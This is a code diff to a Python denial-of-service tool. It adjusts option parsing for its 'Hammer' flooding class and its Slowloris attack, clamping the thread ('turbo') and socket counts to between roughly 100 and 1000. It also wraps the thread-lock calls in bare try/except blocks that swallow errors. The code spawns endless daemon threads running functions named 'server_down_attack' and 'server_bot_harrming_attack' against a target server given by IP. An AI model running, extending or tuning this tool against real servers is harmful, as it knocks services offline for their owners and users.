@@ -23,8 +23,8 @@ def get_parameter():
 	# optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
     optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
     optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
-    optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
-    optp.add_option("-c", "--socket-count",type="int",dest="socket_count",help="socket_count for Slowloris attack default 100")
+    optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 [135 >= turbo <= 1000]")
+    optp.add_option("-c", "--socket-count",type="int",dest="socket_count",help="socket_count for Slowloris attack default 100 [100 >= socket count <= 1000]")
     optp.add_option("", "--https",dest="it_is_https", action="store_true",help="if the target server is https use this",default=False)
     optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
     opts, args = optp.parse_args()
@@ -38,13 +38,18 @@ def get_parameter():
         port = 80
     else:
         port = opts.port
-    if opts.turbo is None:
+
+    if opts.turbo is None or opts.turbo < 135:
         turbo = 135
+    elif opts.turbo > 1000:
+        turbo = 1000
     else:
         turbo = opts.turbo
     
-    if opts.socket_count is None:
+    if opts.socket_count is None or opts.socket_count <= 100:
         socket_count = 100
+    elif opts.socket_count > 1000:
+        socket_count = 1000
     else:
         socket_count = opts.socket_count
     
@@ -223,8 +228,11 @@ class Hammer:
 
         while True:
             
-            thread_lock.acquire()
-
+            try:
+                thread_lock.acquire()
+            except:
+                pass
+            
             for _ in range(self.turbo):
                 threading.Thread(target=self.server_down_attack, daemon=True).start()
                 threading.Thread(target=self.server_bot_harrming_attack, daemon=True).start()
@@ -237,7 +245,10 @@ class Hammer:
                 task_count += 1
                 self.queue_one.put(task_count)
                 self.queue_two.put(task_count)
-                thread_lock.release()
+                try:
+                    thread_lock.release()
+                except:
+                    pass
             
     def __del__(self):
 
@@ -309,11 +320,17 @@ class Slowloris:
         
         while True:
             
-            thread_lock.acquire()               
+            try:
+                thread_lock.acquire()               
+            except:
+                pass
             
             Log.ok(f"Slowloris Sending keep-alive headers... Socket count: {len(list_of_sockets)}")
             
-            thread_lock.release()
+            try:
+                thread_lock.release()
+            except:
+                pass
 
             for s in list(list_of_sockets):
                 try:
